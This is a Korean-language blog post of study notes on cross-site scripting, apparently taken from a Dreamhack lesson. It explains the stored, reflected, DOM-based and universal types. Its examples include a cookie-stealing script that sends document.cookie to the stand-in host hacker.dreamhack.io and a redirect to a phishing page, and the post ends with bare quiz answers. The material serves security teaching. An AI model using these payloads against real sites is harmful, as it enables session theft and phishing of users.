---
title: Dreamhack XSS
date: 2022-02-15 15:40:49
tags: Dreamhack
categories: Dreamhack
---

## Summary
- Cross Site Scripting : 클라이언트 사이드 취약점 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 브라우저에서 해당 스크립트를 실행하는 취약점
- Stored XSS : 악성 스크립트가 서버 내에 존재 이용자가 저장된 악성 스크립트를 조회할 때 발생
- Reflected XSS : 악성 스크립트가 이용자 요청 내에 존재 이용자가 악성 스크립트가 포함된 요청을 보낸 후 응답을 출력할 때 발생

클라이언트 사이드 취약점은 웹 페이지의 이용자를 대상으로 공격할 수 있는 취약점입니다
해당 종류의 취약점을 통해 이용자를 식별하기 위한 세션 및 쿠키 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있습니다

## XSS
![SQL](https://kr.object.ncloudstorage.com/dreamhack-content/page/ec908887275888814f205b00c517a092ff1de4bddc70e424438dee8f1c11c33d.png)

XSS 는 클라이언트 사이드 취약점 중 하나로 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 브라우저에서 해당 스크립트를 실행할 수 있습니다

공격자는 해당 취약점을 통해 특정 계정의 세션 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있습니다

예를들어 드림핵 페이지에서 XSS 취약점이 존재하면 https://dreamhack.io 내에서 오리진 권한으로 악성 스크립트를 삽입합니다

이후에 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자가 임의로 삽입한 스크립트가 실행되어 쿠키 및 세션이 탈취될 수 있습니다

해당 취약점은 SOP 보안 정책이 등장하면서 서로 다른 오리진에서는 정보를 읽는 행위가 이전에 비해 힘들어졌습니다
그러나 이를 우회하는 다양한 기술이 소개되면서 XSS 공격은 지속되고 있습니다

## XSS 발생 예시와 종류
XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생합니다
이러한 기능의 예로는 로그인 시 출력되는 안녕하세요 OO 회원님 과 같은 문구 또는 게시글과 댓글이 있습니다

클라이언트는 HTTP 형식으로 웹 서버에 리소스를 요청하고 서버로부터 받은 응답 즉 HTML CSS JS 등의 웹 리소스를 시각화하여 이용자에게 보여줍니다

이때 HTML CSS JS 와 같은 코드가 포함된 게시물을 조회할 경우 이용자는 변조된 페이지를 보거나 스크립트가 실행될 수 있습니다

이는 오른쪽 모듈에 `<script>` 태그를 삽입하여 실습해 볼 수 있습니다

XSS 는 발생 형태에 따라서 다양한 종류로 구분되는데 아래에서 XSS 종류와 악성 스크립트가 삽입되는 위치를 확인할 수 있습니다

종류 : Stored XSS
설명 : XSS 에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS

종류 : Reflected XSS
설명 : XSS 에 사용되는 악성 스크립트가 URL 에 삽입되고 서버의 응답에 담겨오는 XSS

종류 : DOM-based XSS
설명 : XSS 에 사용되는 악성 스크립트가 URL Fragment 에 삽입되는 XSS

Fragment 는 서버 요청 / 응답에 포함되지 않습니다

종류 : Universal XSS
설명 : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS

```
<script>alert(1)</script>
```

```html
<div>
    <h3 class="title"><script>alert(1)</script></h3>
    <p class="content"><script>alert(1)</script></p>
</div>
```

## XSS 스크립트의 예시
자바스크립트는 웹 문서의 동작을 정의합니다
이는 이용자가 버튼 클릭 시에 어떤 이벤트를 발생시키질지와 데이터 입력 시 해당 데이터를 전송하는 이벤트를 구현할 수 있습니다

이러한 기능 외에도 이용자와의 상호 작용 없이 이용자의 권한으로 정보를 조회하거나 변경하는 등의 행위가 가능합니다

이러한 행위가 가능한 이유는 이용자를 식별하기 위한 세션 및 쿠키가 브라우저에 저장되어 있기 때문입니다

따라서 공격자는 자바스크립트를 통해 이용자에게 보여지는 페이지를 조작하거나 브라우저의 위치를 임의의 주소로 변경할 수 있습니다

자바스크립트는 다양한 동작을 정의할 수 있기 때문에 XSS 공격에 주로 사용됩니다
자바스크립트를 실행하기 위한 태그로는 `<script>` 가 있습니다

Figure 1 쿠키 및 세션 탈취 공격 코드
```javascript
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

Figure 2 페이지 변조 공격 코드
```javascript
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

Figure 3 위치 이동 공격 코드
```javascript
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

## Stored XSS
Stored XSS 는 서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 조회할 때 발생하는 XSS 입니다

게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있습니다

게시물은 불특정 다수에게 보여지기 때문에 해당 기능에서 XSS 취약점이 존재할 경우 높은 파급력을 가집니다

오른쪽은 게시물의 내용을 그대로 출력하는 모듈입니다
`<script>` 태그 또는 HTML 태그를 삽입하고 반한되는 HTTP 코드를 확인함으로써 Stored XSS 의 발생 형태를 확인해 볼 수 있습니다

## Reflected XSS
Reflected XSS 는 서버가 악성 스크립트가 담긴 요청을 출력할 때 발생합니다

게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있습니다

이용자가 게시물을 검색하면 서버에서는 검색 결과를 이용자에게 반환합니다

일부 서비스에서는 검색 결과를 응답에 포함하는데 검색 문자열에 악성 스크립트가 포함되어 있다면 Reflected XSS 가 발생할 수 있습니다

Reflected XSS 는 Stored XSS 와는 다르게 URL 과 같은 이용자의 요청에 의해 발생합니다

따라서 공격을 위해서는 타 이용자에게 악성 스크립트가 포함된 링크에 접속하도록 유도해야합니다

이용자에게 링크를 직접 전달하는 방법은 악성 스크립트 포함여부를 이용자가 눈치챌 수 있기 때문에 주로 Click Jacking 또는 Open Redirect 등 다른 취약점과 연계하여 사용합니다

오른쪽 예제에서는 게시판에서 게시물을 조회하는 기능입니다
`<script>` 태그 또는 HTML 태그를 검색창에 삽입하고 반환되는 HTML 코드를 확인함으로써 Reflected XSS 발생 형태를 확인해볼 수 있습니다

## XSS Quiz
> 1. B
2. B
3. A

* * *

## Reference
Reference : https://dreamhack.io